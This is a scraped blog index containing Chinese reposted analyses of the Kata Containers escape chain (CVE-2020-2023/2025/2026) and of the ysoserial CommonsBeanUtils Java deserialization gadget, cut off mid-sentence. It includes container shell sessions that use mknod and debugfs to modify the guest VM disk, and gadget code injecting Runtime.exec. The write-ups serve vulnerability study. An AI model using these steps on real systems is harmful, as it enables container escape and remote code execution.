https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-2023.md[6] https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-2024.md[7] https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-2025.md[8] https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-2026.md[9] https://docs.docker.com/engine/install/ubuntu/[10] https://github.com/kata-containers/runtime/releases/download/1.10.0/kata-static-1.10.0-x86_64.tar.xz[11] https://nvd.nist.gov/vuln/detail/CVE-2020-2023[12] https://nvd.nist.gov/vuln/detail/CVE-2020-2024[13] https://nvd.nist.gov/vuln/detail/CVE-2020-2025[14] https://nvd.nist.gov/vuln/detail/CVE-2020-2026[15] https://github.com/teawater/documentation/blob/4eee7346655d9c954ab595c05e9f5dad0f5efeda/VSocks.md#system-requirements[16] https://github.com/cloud-hypervisor/cloud-hypervisor[17] https://github.com/kata-containers/documentation/tree/master/design[18] https://github.com/opencontainers/runtime-spec[19] https://github.com/kata-containers/kata-containers[20] https://gvisor.dev/docs/[21] https://nvd.nist.gov/vuln/detail/CVE-2019-14271[22] https://www.kernel.org/doc/Documentation/cgroup-v1/devices.txt[23] https://man7.org/linux/man-pages/man2/mknod.2.html[24] https://github.com/moby/moby/blob/a24a71c50f34d53710cccaa4d5e5f62169c5e1dc/oci/caps/defaults.go#L4[25] https://en.wikipedia.org/wiki/Symlink_race[26] https://github.com/kata-containers/documentation/blob/master/design/architecture.md[27] https://github.com/kata-containers/agent/pull/792[28] https://github.com/kata-containers/runtime/pull/2477[29] https://github.com/kata-containers/runtime/pull/2487[30] https://github.com/kata-containers/runtime/pull/2713 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://functfan.github.io/categories/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://functfan.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"KataContainers容器","slug":"KataContainers容器","permalink":"https://functfan.github.io/tags/KataContainers%E5%AE%B9%E5%99%A8/"},{"name":"CVE-2020-2023/2024/2025/2026","slug":"CVE-2020-2023-2024-2025-2026","permalink":"https://functfan.github.io/tags/CVE-2020-2023-2024-2025-2026/"},{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://functfan.github.io/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"}]},{"title":"KataContainers安全容器逃逸-CVE-2020-2023-2024-2025-2026(转载中)","slug":"KataContainers安全容器逃逸-CVE-2020-2023-2024-2025-2026（中）","date":"2021-03-03T06:21:29.000Z","updated":"2021-03-05T08:35:11.689Z","comments":true,"path":"posts/2767170740/","link":"","permalink":"https://functfan.github.io/posts/2767170740/","excerpt":"","text":"版权声明：本文为「星云实验室 绿盟科技研究通讯」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://mp.weixin.qq.com/s/q4xJtlO6iFpHQginGvVBDQ CVE-2020-2025 该漏洞也属于权限控制问题——在存在漏洞的环境中，虚拟机镜像并未以只读模式挂载。因此，虚拟机能够对硬盘进行修改，并将修改持久化到虚拟机镜像中。这样一来，后续所有新虚拟机都将从修改后的镜像创建了。 我们来验证一下。思路是，在之前CVE-2020-2023的基础上，先启动一个容器，使用debugfs向虚拟机硬盘中写入一个flag.txt文件，内容为hello, kata，然后销毁该容器，再次创建一个新容器，在其中使用debugfs查看文件系统是否存在上述文件，以判断虚拟机镜像是否被改写。具体的过程如下： 12345678910111213141516171819202122root# docker run --rm -it ubuntu /bin/bashroot@28caf254e3b3:/# mknod --mode 0600 /dev/guest_hd b 254 1root@28caf254e3b3:/# echo \"hello, kata\" &gt; flag.txtroot@28caf254e3b3:/# /sbin/debugfs -w /dev/guest_hddebugfs 1.45.5 (07-Jan-2020)debugfs: cd usr/bindebugfs: write flag.txt flag.txtAllocated inode: 172debugfs: close -adebugfs: quitroot@28caf254e3b3:/# exitexitroot#root# docker run --rm -it ubuntu /bin/bashroot@1773bd058e1b:/# mknod --mode 0600 /dev/guest_hd b 254 1root@1773bd058e1b:/# /sbin/debugfs -w /dev/guest_hddebugfs 1.45.5 (07-Jan-2020)debugfs: cd usr/bindebugfs: dump flag.txt flag.txtdebugfs: quitroot@1773bd058e1b:/# cat flag.txthello, kata 可以看到，虚拟机镜像确实被改写了。 CVE-2020-2026 CVE-2020-2026属于非常典型的一类漏洞——符号链接处理不当引起的安全问题[25]。我们来抽丝剥茧，一步步分析这个漏洞。 在「背景知识」部分，我们已经介绍了Kata Containers的基本组件，下面是Kata Containers执行OCI命令create时组件间的交互时序图 [26]： 其中，virtcontainers曾经是一个独立的项目，现在已经成为kata-runtime的一部分，它为构建硬件虚拟化的容器运行时提供了一套Go语言库。除此以外，上图涉及到的其他组件我们都介绍过了。 可以看到，Docker引擎向kata-runtime下发create指令，然后，kata-runtime通过调用virtcontainers的CreateSandbox来启动具体的容器创建过程。接着，virtcontainers承担起主要职责，调用Hypervisor提供的服务去创建网络、启动虚拟机。 我们重点关注virtcontainers向agent发起的CreateSandbox调用，从这里开始，virtcontainers与agent连续两次请求响应，是容器创建过程中最核心的部分，也是CVE-2020-2026漏洞存在的地方： 1234virtcontainers --- CreateSandbox ---&gt; agentvirtcontainers &lt;-- Sandbox Created -- agentvirtcontainers -- CreateContainer --&gt; agentvirtcontainers &lt;--Container Created-- agent 这里的Sandbox与Container有什么不同呢？Sandbox是一个统一、基本的隔离空间，一个虚拟机中只有一个Sandbox，但是该Sandbox内可以有多个容器，这就对应了Kubernetes Pod的模型；对于Docker来说，一般一个Sandbox内只运行一个Container。无论是哪种情况，Sandbox的ID与内部第一个容器的ID相同。 在上面这两来两往的过程中，容器即创建完成。我们知道，容器是由镜像创建而来，那么kata-runtime是如何将镜像内容传递给虚拟机内部kata-agent的呢？答案是，将根文件目录（rootfs）挂载到宿主机与虚拟机的共享目录中。 首先，runtime/virtcontainers/kata_agent.go的startSandbox函数向kata-agent发起gRPC调用： 123456789101112storages := setupStorages(sandbox)kmodules := setupKernelModules(k.kmodules)req := &amp;grpc.CreateSandboxRequest{ Hostname: hostname, Dns: dns, Storages: storages, SandboxPidns: sandbox.sharePidNs, SandboxId: sandbox.id, GuestHookPath: sandbox.config.HypervisorConfig.GuestHookPath, KernelModules: kmodules,} 可以看到，其中带有SandboxId和Storages参数。其中，Storages的值来自setupStorages函数，这个函数用于配置共享目录的存储驱动、文件系统类型和挂载点等。Storages内的元素定义如下（setupStorages函数）： 1234567sharedVolume := &amp;grpc.Storage{ Driver: kataVirtioFSDevType, Source: mountGuestTag, MountPoint: kataGuestSharedDir(), Fstype: typeVirtioFS, Options: sharedDirVirtioFSOptions,} 其中，kataGuestSharedDir函数会返回共享目录在虚拟机内部的路径，也就是MountPoint的值：/run/kata-containers/shared/containers/。 OK，切换到kata-agent侧。当它收到gRPC调用请求后，内部的CreateSandbox函数开始执行（位于agent/grpc.go）。具体如下（我们省略了内核模块加载、命名空间创建等代码逻辑）： 1234567891011121314151617181920212223func (a *agentGRPC) CreateSandbox(ctx context.Context, req *pb.CreateSandboxRequest) (*gpb.Empty, error) { if a.sandbox.running { return emptyResp, grpcStatus.Error(codes.AlreadyExists, \"Sandbox already started, impossible to start again\") } // 省略... if req.SandboxId != \"\" { a.sandbox.id = req.SandboxId agentLog = agentLog.WithField(\"sandbox\", a.sandbox.id) } // 省略... mountList, err := addStorages(ctx, req.Storages, a.sandbox) if err != nil { return emptyResp, err } a.sandbox.mounts = mountList if err := setupDNS(a.sandbox.network.dns); err != nil { return emptyResp, err } return emptyResp, nil} 可以看到，在收到请求后，kata-agent会调用addStorages函数去根据kata-runtime的指令挂载共享目录，经过深入，该函数最终会调用mountStorage函数执行挂载操作： 123456// mountStorage performs the mount described by the storage structure.func mountStorage(storage pb.Storage) error { flags, options := parseMountFlagsAndOptions(storage.Options) return mount(storage.Source, storage.MountPoint, storage.Fstype, flags, options)} 这里的MountPoint即是来自kata-runtime的/run/kata-containers/shared/containers/。至此，宿主机与虚拟机的共享目录已经挂载到了虚拟机内。 最后，CreateSandbox执行完成，kata-runtime收到回复。 那么，kata-runtime什么时候会向共享目录中挂载呢？如下图所示，发送完CreateSandobx请求后，kata-runtme在bindMountContainerRootfs中开始挂载容器根文件系统： 代码如下： 12345678func bindMountContainerRootfs(ctx context.Context, sharedDir, sandboxID, cID, cRootFs string, readonly bool) error { span, _ := trace(ctx, \"bindMountContainerRootfs\") defer span.Finish() rootfsDest := filepath.Join(sharedDir, sandboxID, cID, rootfsDir) return bindMount(ctx, cRootFs, rootfsDest, readonly)} 其中，rootfsDest是宿主机上共享目录中容器根文件系统的位置。它的形式是/run/kata-containers/shared/sandboxes/sandbox_id/container_id/rootfs，其中sandbox_id与container_id分别是Sandbox和容器的ID。如前所述，对于只运行一个容器的情况来说，这两个ID是一致的；cRootFs是根文件系统在虚拟机内部共享目录中的挂载位置，形式为/run/kata-containers/shared/containers/sandbox_id/rootfs。 在函数的末尾，bindMount函数执行实际的绑定挂载任务： 12345678910111213func bindMount(ctx context.Context, source, destination string, readonly bool) error { // 省略... absSource, err := filepath.EvalSymlinks(source) // 重点！！！ if err != nil { return fmt.Errorf(\"Could not resolve symlink for source %v\", source) } // 省略... if err := syscall.Mount(absSource, destination, \"bind\", syscall.MS_BIND, \"\"); err != nil { return fmt.Errorf(\"Could not bind mount %v to %v: %v\", absSource, destination, err) } // 省略... return nil} 重点来了！该函数会对虚拟机内部的挂载路径做符号链接解析。 符号链接解析是在宿主机上进行的，但是实际的路径位于虚拟机内。如果虚拟机由于某种原因被攻击者控制，那么攻击者就能够在挂载路径上创建一个符号链接，kata-runtime将把容器根文件系统挂载到该符号链接指向的宿主机上的其他位置！ 举例来说，假如虚拟机内部的kata-agent被攻击者替换为恶意程序，该恶意agent在收到CreateSandbox请求后，根据拿到的Sandbox ID在/run/kata-containers/shared/containers/sandbox_id/创建一个名为rootfs的符号链接，指向/tmp/xxx目录，那么之后kata-runtime在进行绑定挂载时，就会将容器根文件系统挂载到宿主机上的/tmp/xxx目录下。在许多云场景下，容器镜像是攻击者可控的， 因此——他够将特定文件放在宿主机上的特定位置，从而实现虚拟机逃逸。 第一眼看到CVE-2020-2026，也许有的朋友会觉得不太好利用，攻击者不是在容器里么？如何跑到虚拟机里？ 是的，一般情况下的确比较困难，但是一旦与CVE-2020-2023、CVE-2020-2025结合起来，就有可能了。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://functfan.github.io/categories/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://functfan.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"KataContainers容器","slug":"KataContainers容器","permalink":"https://functfan.github.io/tags/KataContainers%E5%AE%B9%E5%99%A8/"},{"name":"CVE-2020-2023/2024/2025/2026","slug":"CVE-2020-2023-2024-2025-2026","permalink":"https://functfan.github.io/tags/CVE-2020-2023-2024-2025-2026/"},{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://functfan.github.io/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"}]},{"title":"KataContainers安全容器逃逸-CVE-2020-2023/2024/2025/2026(转载上)","slug":"KataContainers安全容器逃逸-CVE-2020-2023-2024-2025-2026（上）","date":"2021-03-03T05:59:34.000Z","updated":"2021-03-03T06:51:21.965Z","comments":true,"path":"posts/3420123780/","link":"","permalink":"https://functfan.github.io/posts/3420123780/","excerpt":"","text":"版权声明：本文为「星云实验室 绿盟科技研究通讯」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://mp.weixin.qq.com/s/q4xJtlO6iFpHQginGvVBDQ 简介在2020年Black hat北美会议上，来自Palo Alto Networks的高级安全研究员Yuval Avrahami分享了利用多个漏洞成功从Kata containers逃逸的议题[1]。 作为一种轻量级虚拟化技术，传统容器与宿主机共享内核，这意味着系统内核权限提升漏洞往往也可用来实施容器逃逸。为了彻底解决这一问题，在轻量与安全性之间达到较好的平衡，安全容器应运而生。Kata Containers是一种安全容器的具体实现，其他主流的安全容器还有Google推出的gVisor[4]等。 Kata Containers项目最初由Hyper.sh的runV项目与Intel的Clear Container合并而来，并于2017年开源[2]。它的核心思想是，为每一个容器运行一个独立虚拟机，从而避免其与宿主机共享内核。这样一来，即使攻击者在容器内部成功利用了内核漏洞攻破内核，他依然被限制在虚拟机内部，无法逃逸到宿主机上。Kata Containers在官方介绍中[3]直观地展示了它与传统容器之间的异同： 从上图可以得出结论，在不考虑其他因素的情况下，如果Kata Containers内部的攻击者想要逃逸到宿主机上，他必须至少经过两次逃逸——「容器逃逸」和「虚拟机逃逸」，才能达到目的。也就是说，单一的漏洞可能将不再奏效，攻击者需要构建一条漏洞利用链。 事实上，Yuval Avrahami也是这么做的。他分享的议题中一共涉及四个漏洞： CVE-2020-2023：Kata Containers容器不受限地访问虚拟机的根文件系统设备[5]，CVSS 3.x评分为6.3[11]； CVE-2020-2024：Kata Containers运行时（runtime）在卸载（unmount）挂载点时存在符号链接解析漏洞，可能允许针对宿主机的拒绝服务攻击[6]，CVSS 3.x评分为6.5[12]； CVE-2020-2025：基于Cloud Hypervisor的Kata Containers会将虚拟机文件系统的改动写入到虚拟机镜像文件（在宿主机上）[7]，CVSS 3.x评分为8.8[13]； CVE-2020-2026：Kata Containers运行时在挂载（mount）容器根文件系统（rootfs）时存在符号链接解析漏洞，可能允许攻击者在宿主机上执行任意代码[8]，CVSS 3.x评分为8.8[14]。 其中，CVE-2020-2024主要会导致拒绝服务攻击，对逃逸帮助不大。逃逸主要依靠其他三个漏洞形成的利用链条来实现。 这个议题精彩又富有意义。它让我们意识到，即使是采用了独立内核的“安全容器”，也存在逃逸风险。换句话说，安全没有银弹。 本文将对该议题中的逃逸过程（Container-to-Host）及相关的三个漏洞进行详解和复现。 注： 相关漏洞在新版本Kata Containers中均已得到修复。 文中涉及到的是Kata Containers 1.x系列版本，2.x有所差异但相关度不大，不再涉及，感兴趣的读者可以参考官方文档[19]。 后文过程中使用的Kata Containers组件、源码版本如无特殊说明，均为1.10.0。 背景知识安全容器「安全容器」一词，是相对于传统容器而言的。作为一种虚拟化技术，虽然容器本身已经提供了一定程度上的隔离性，但这种隔离性时不时就会被打破。问题的根源在于，传统容器与宿主机共享内核，内核漏洞势必会直接影响容器的安全性。然而由于内核的复杂度过高等原因，近年来，高危内核漏洞层出不穷。 那么，为什么不直接使用虚拟机呢？答案很明显，性能和资源开销问题使得传统虚拟机技术在现今很多场景和开发部署模式下并不适用，而这也恰恰是容器技术流行的主要原因之一。因此，人们引入了安全容器，希望在轻量化和安全性上达到较好的平衡。 随着云原生技术和生态的发展，开源安全容器项目也在陆续增多。下面，我们介绍两种主流、目标一致但原理各异的安全容器项目：Kata Containers和gVisor。 &gt;&gt;&gt;&gt; Kata Containers 在「简介」部分，我们已经概括了Kata Containers项目的诞生和原理相关信息，这里不再重复。我们来深入了解一下Kata Containers，这对后面的漏洞分析和利用有帮助。Kata Containers符合OCI运行时规范[18]，能够替换runC，与Docker引擎无缝对接，也支持Kubernetes。 下图[2]清晰展示了Kata Containers的组件及各自的角色位置： 我们来分别介绍一下各个组件及其作用： runtime：容器运行时，负责处理来自Docker引擎或Kubernetes等上层设施的命令（OCI规范定义）及启动kata-shim，程序名为kata-runtime。 agent：运行在虚拟机中，与runtime交互，用于管理容器及容器内进程，程序名为kata-agent。 proxy：负责宿主机与虚拟机之间的通信（对shim、runtime及agent之间的I/O流及信号进行路由），如果宿主机内核支持vsock，则proxy是非必要的，程序名为kata-proxy。 shim：容器进程收集器，用来监控容器进程并收集、转发I/O流及信号，程序名为kata-shim。 hypervisor：虚拟机监视器，负责虚拟机的创建、运行、销毁等管理，有多种选择，QEMU、Cloud Hypervisor等。 虚拟机：由高度优化过的内核和文件系统镜像文件创建而来，负责为容器提供一个更强的隔离环境。 欲了解更多关于Kata Containers的内容，可以参考官方文档[3][17]。 &gt;&gt;&gt;&gt; gVisor gVisor是由Google开源的一款安全容器，它在实现上与Kata Containers有明显不同。Kata Containers虽然同样避免了容器与宿主机共享内核，但它的思路是提供一个虚拟机，容器与虚拟机共享内核；而gVisor则直接在用户层实现了内核，用来拦截容器内程序对系统API的调用，处理并响应。 欲了解更多关于gVisor的内容，可以参考官方文档[20]。 Cloud Hypervisor Cloud Hypervisor是一个开源的虚拟机监视器（VMM），基于KVM运行。该项目专注于在受限硬件基础架构和平台上运行现代云计算工作流。它采用Rust语言实现，基于rust-vmm创建。 从1.10.0版本起，Kata Containers支持采用Cloud Hypervisor作为它的虚拟机监视器。 欲了解更多关于Cloud Hypervisor的内容，可以参考官方文档[16]。 漏洞分析如「简介」部分所述，从容器到宿主机的逃逸涉及三个漏洞的使用，由「容器逃逸」和「虚拟机逃逸」两部分组成。 其中，容器逃逸涉及到的漏洞是CVE-2020-2023，虚拟机逃逸涉及到的漏洞是CVE-2020-2025和CVE-2020-2026。其中，前两个是权限控制的问题，最后一个漏洞则是云原生环境下的“常客”——未限制符号链接解析导致的文件系统逃逸问题，类似的漏洞还有CVE-2019-14271[21]等。 下面我们分别进行简单分析。 CVE-2020-2023 这个漏洞是典型的权限控制问题——容器内部可以访问并修改虚拟机的文件系统。其根源之一在于，Kata Containers并未通过Device Cgroup[21]限制容器对虚拟机设备的访问，因此容器能够通过创建设备文件的方式来访问到虚拟机设备。 创建设备文件需要用到mknod系统调用，而mknod需要Capabilities中的CAP_MKNOD权限[23]。那么容器是否拥有这个权限呢？不同引擎的规定不一定相同，但至少默认情况下Docker引擎是支持此权限的[24]： 123456789101112131415161718192021// moby/oci/caps/defaults.gopackage caps // import \"github.com/docker/docker/oci/caps\"// DefaultCapabilities returns a Linux kernel default capabilitiesfunc DefaultCapabilities() []string { return []string{ \"CAP_CHOWN\", \"CAP_DAC_OVERRIDE\", \"CAP_FSETID\", \"CAP_FOWNER\", \"CAP_MKNOD\", // 容器有此权限！ \"CAP_NET_RAW\", \"CAP_SETGID\", \"CAP_SETUID\", \"CAP_SETFCAP\", \"CAP_SETPCAP\", \"CAP_NET_BIND_SERVICE\", \"CAP_SYS_CHROOT\", \"CAP_KILL\", \"CAP_AUDIT_WRITE\", }} 为了进一步确定，我们可以在Kata Containers创建的容器中来验证一下： 1234567root# docker run --rm -it ubuntu /bin/bashroot@df2cff910fdb:/# grep CapEff /proc/self/statusCapEff: 00000000a80425fbroot@df2cff910fdb:/# exitexitroot# capsh --decode=00000000a80425fb0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap 首先从容器中/proc/self/status文件获取到Capabilities的具体值，然后对其进行解析。结果显示，容器确实拥有CAP_MKNOD权限。 既然如此，再结合CVE-2020-2023，我们进一步来尝试下能否在容器内通过创建设备文件来访问、甚至修改设备。 在存在漏洞的环境中（后文「逃逸复现-环境准备」小节给出了搭建漏洞环境的方法，读者可参考），创建一个容器；在容器内，首先我们需要找到底层虚拟机块设备的设备号，然后创建设备文件。 /sys/dev/block/目录下是各种块设备的符号链接，文件名即为目标块设备的主次设备号，我们要找到目标块设备为vda1的符号链接文件名，从而获得主次设备号。 例如，在笔者的环境下： 12root@7d30fe24da7e:/# ls -al /sys/dev/block/ | grep vda1lrwxrwxrwx 1 root root 0 Sep 23 03:16 254:1 -&gt; ../../devices/pci0000:00/0000:00:01.0/virtio0/block/vda/vda1 找到主设备号为254，次设备号为1。在获取设备号后，即可使用mknod创建设备文件： 1mknod --mode 0600 /dev/guest_hd b 254 1 接着，就可以对该设备进行访问和操作了。这里我们可以借助debugfs工具来实现： 123456789root@7d30fe24da7e:/# /sbin/debugfs -w /dev/guest_hddebugfs 1.45.5 (07-Jan-2020)debugfs: ls 2 (12) . 2 (12) .. 11 (20) lost+found 12 (16) autofs 13 (12) bin 14 (12) boot 15 (12) dev 16 (12) etc 21 (12) home 22 (12) lib 23 (16) lib64 24 (16) media 25 (12) mnt 26 (12) proc 27 (12) root 28 (12) run 29 (12) sbin 30 (12) srv 31 (12) sys 32 (12) tmp 33 (12) usr 2061 (3824) var 果然，漏洞存在时，我们的确能够访问虚拟机文件系统。那么，能否修改呢？可以的，例如，kata-agent就在usr/bin目录下： 123456debugfs: cd usr/bindebugfs: ls 435 (12) . 33 (12) .. 436 (20) kata-agent 437 (16) ldconfig 438 (16) chronyc 439 (16) chronyd 440 (16) capsh 441 (16) getcap 442 (16) getpcaps 443 (16) setcap 444 (12) su 445 (16) bootctl 446 (16) busctl 447 (20) coredumpctl 我们可以直接删除它： 1234567debugfs: rm kata-agentdebugfs: ls 435 (12) . 33 (32) .. 437 (16) ldconfig 438 (16) chronyc 439 (16) chronyd 440 (16) capsh 441 (16) getcap 442 (16) getpcaps 443 (16) setcap 444 (12) su 445 (16) bootctl 446 (16) busctl 447 (20) coredumpctl 448 (12) halt 可以看到，操作执行成功，kata-agent被删除了。 我们能够修改文件系统，说明它以读写模式挂载，这是漏洞根源之二。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://functfan.github.io/categories/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://functfan.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"KataContainers容器","slug":"KataContainers容器","permalink":"https://functfan.github.io/tags/KataContainers%E5%AE%B9%E5%99%A8/"},{"name":"CVE-2020-2023/2024/2025/2026","slug":"CVE-2020-2023-2024-2025-2026","permalink":"https://functfan.github.io/tags/CVE-2020-2023-2024-2025-2026/"},{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://functfan.github.io/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"}]},{"title":"CVE-2020-15257-containerd容器逃逸-<1.3.9|1.4.3","slug":"CVE-2020-15257-containerd容器逃逸-1-3-9-1-4-3","date":"2021-03-01T05:45:02.000Z","updated":"2021-03-01T05:45:36.450Z","comments":true,"path":"posts/497175673/","link":"","permalink":"https://functfan.github.io/posts/497175673/","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Java反序列化之CommonsBeanUtils 分析（转载）","slug":"Java反序列化之CommonsBeanUtils-分析（转载）","date":"2020-07-28T08:29:59.000Z","updated":"2020-07-28T08:32:01.497Z","comments":true,"path":"posts/1312971051/","link":"","permalink":"https://functfan.github.io/posts/1312971051/","excerpt":"","text":"Author: rungobier (知道创宇404安全实验室) Date: 2016-03-04 一、简介前几天看到 github 上的 ysoserial 更新至0.0.4，增加了 CommonsBeanUtils 的Java反序列化 Payload 生成代码，原以为跟前面的 CommonsCollections 的原理一样，仔细看了一遍思路大不相同。CommonsBeanutilsCollectionsLogging1 主要依赖的 jar 包有：commons-collections(2.0-3.2.2), commons-beanutils-1.9.2, commons-loggings-1.2。 二、序列化CommonsBeanutilsCollectionsLogging1 的主要代码如下: 1234567891011121314151617181920public Object getObject(final String command) throws Exception { final TemplatesImpl templates = Gadgets.createTemplatesImpl(command); // mock method name until armed final BeanComparator comparator = new BeanComparator(\"lowestSetBit\"); // create queue with numbers and basic comparator final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator); // stub data for replacement later queue.add(new BigInteger(\"1\")); queue.add(new BigInteger(\"1\")); // switch method called by comparator Reflections.setFieldValue(comparator, \"property\", \"outputProperties\"); // switch contents of queue final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, \"queue\"); queueArray[0] = templates; queueArray[1] = templates; return queue;} 在 CommonsCollections 的 payload 生成过程当中，需要形成反序列化的调用链。刚开始我以为这个是 CommonsCollections 的更新升级版，特意追了下 commons-collections 的相关代码，发现 commons-collections 在这里只是起到辅助作用，仅在 BeanComparator 中用到了 ComparableComparator 这个类，追踪了下 ComparableComparator 的源代码，它从 commons-collections-2.0 就已经存在了，而且在最新版本的 commons-collections 也未做较大改动。 下面是 BeanComparator 的相关代码： 123456789101112131415161718192021222324252627package org.apache.commons.beanutils;import java.io.Serializable;import java.lang.reflect.InvocationTargetException;import java.util.Comparator;import org.apache.commons.collections.comparators.ComparableComparator;...public class BeanComparator&lt;T&gt; implements Comparator&lt;T&gt;, Serializable { private String property; private final Comparator&lt;?&gt; comparator;... public BeanComparator( String property ) { this( property, ComparableComparator.getInstance() ); }... public BeanComparator( String property, Comparator&lt;?&gt; comparator ) { setProperty( property ); if (comparator != null) { this.comparator = comparator; } else { this.comparator = ComparableComparator.getInstance(); } }} 回归正题，在今天这个 payload 生成过程当中也需要形成反序列化的调用链，PriorityQueue 是符合这个条件的，其自身实现了 readObject。PriorityQueue 是使用数组实现的完全二叉树优先队列，不允许空值，而且不支持 non-comparable 的对象。在最终达到 Runtime.exec 之前，需要解决以下几个问题： 放入PriorityQueue的对象需要实现readObject 要实现Comparable接口 经过第一个条件的过滤之后，可以发现 jdk 中的 TemplatesImpl 类可以满足条件。 但是，TemplatesImpl 未实现 Comparable 接口，为了绕过这个，可以看到代码当中首先添加了两个 BigInteger 值为1的对象。BeanComparator 中设置的比较属性为 lowestSetBit，这里也可以改为 BigInteger 其它的可比较属性名称，前期分析过程当中原以为是为了在比较过程当中利用特定的属性触发某些条件，继续跟踪下去发现根本不是。 由于PriorityQuque的泛型类型设置为了Object，所以是任何实现了Comparable接口的对象都可以放进去的。那么不可比较的templates对象怎么处理？ 首先，利用 Java 反射机制将 Comparator的property 设置为 TemplatesImpl 的属性 outputProperties，但是这个属性在这里未起到比较的作用。它的重要作用将在 payload 反序列化时体现。 其次，我们看到代码利用反射机制直接获取了 PriorityQueue 的内置属性数组 queue，将 templates 按照索引值填入了 queue，这样做是利用了 Java 的泛型的类型擦除，这里简单介绍下类型擦除，早期的 Java 语言是不支持泛型的，后来在Java5 当中加入了泛型支持，在 Java 编译阶段将具体的类型信息擦除了，所以在 Java 的泛型代码内部，是无法获得任何有关泛型参数类型的信息。这样就规避掉了条件二的限制，并且在序列化数据中保留了 templates 的类型信息，不得不说这段代码实现的非常精巧。 如果不做上述的处理，直接使用 queue.add 方法添加 templates,在生成 payload 时，将会触发 Java 的 SecurityManager 安全机制，抛出异常。 最后，这段代码中精心构造的 PriorityQueue 对象，包含的两个 TemplatesImpl 对象被序列化，相关被序列化的还有 BeanComparator 对象的属性 property ，它的值为 outputProperties。 下面我们看看对象 templates 的生成相关代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 static { // special case for using TemplatesImpl gadgets with a SecurityManager enabled System.setProperty(DESERIALIZE_TRANSLET, \"true\"); } public static class StubTransletPayload extends AbstractTranslet implements Serializable { private static final long serialVersionUID = -5971610431559700674L; public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} } // required to make TemplatesImpl happy public static class Foo implements Serializable { private static final long serialVersionUID = 8207363842866235160L; }......... public static TemplatesImpl createTemplatesImpl(final String command) throws Exception { final TemplatesImpl templates = new TemplatesImpl(); // use template gadget class ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(StubTransletPayload.class)); final CtClass clazz = pool.get(StubTransletPayload.class.getName()); // run command in static initializer // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections clazz.makeClassInitializer().insertAfter(\"java.lang.Runtime.getRuntime().exec(\\\"\" + command.replaceAll(\"\\\"\", \"\\\\\\\"\") +\"\\\");\"); // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion) clazz.setName(\"ysoserial.Pwner\" + System.nanoTime()); final byte[] classBytes = clazz.toBytecode(); // inject class bytes into instance Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][] { classBytes, ClassFiles.classAsBytes(Foo.class)}); // required to make TemplatesImpl happy Reflections.setFieldValue(templates, \"_name\", \"Pwnr\"); Reflections.setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); return templates; } 上述代码中的重点是利用了 Javaassist 这个动态代理库，这个库在我看来实现了 Java 当中的元编程，就是让 Java 